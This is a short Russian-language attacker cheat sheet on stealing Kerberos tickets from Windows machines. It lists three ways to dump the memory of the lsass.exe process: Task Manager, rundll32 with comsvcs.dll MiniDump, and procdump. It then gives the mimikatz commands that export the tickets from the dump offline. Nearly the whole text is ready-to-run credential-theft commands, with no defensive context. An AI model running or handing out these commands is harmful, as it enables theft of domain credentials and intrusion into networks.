## Извлечение Kerberos-билетов через дамп виртуальной памяти:
**Три способа дампа памяти:**  
1) taskmgr.exe → ПКМ по lsass.exe → дамп памяти;  
2) rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full  
3) procdump.exe -ma lsass.exe /accepteula.  
  
Если дамп удалось создать, то билеты можно безопасно извлечь уже на своей стороне:  
mimikatz.exe -> sekurlsa::Minidump lsass.dmp -> sekurlsa::tickets /export  
